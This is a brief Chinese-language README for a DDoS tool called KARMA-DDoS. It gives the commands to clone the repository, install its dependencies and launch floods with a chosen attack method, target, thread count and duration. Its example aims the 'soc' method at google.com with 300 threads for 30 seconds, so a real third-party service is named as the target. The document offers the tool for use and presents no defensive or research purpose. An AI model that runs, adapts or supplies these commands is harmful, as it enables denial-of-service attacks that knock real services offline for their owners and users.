## **安装项目**
_1. 克隆项目_
```shell
git clone https://github.com/HyukIsBack/KARMA-DDoS
```
_2.打开项目_
```shell
cd KARMA-DDoS
```
_3.安装依赖_
```shell
python3 setup.py
```

## **使用方法**
_1. 命令行_
```c
python3 main.py <攻击方式> <目标> <攻击线程> <攻击时间(秒)>
```
_2.例子_
```python
python3 main.py soc https://google.com 300 30
##使用 soc攻击方式 攻击google.com 使用300个线程 持续30秒##
```
